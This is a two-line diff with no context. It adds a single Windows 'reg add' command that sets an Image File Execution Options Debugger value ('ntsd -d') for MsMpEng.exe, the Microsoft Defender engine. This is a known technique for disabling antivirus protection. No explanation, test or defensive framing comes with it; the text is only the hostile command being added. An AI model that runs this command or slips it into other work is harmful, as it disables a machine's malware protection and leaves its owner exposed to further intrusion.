@@ -1,0 +1,2 @@
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MsMpEng.exe" /v Debugger /t REG_SZ /d "ntsd -d" /f
+
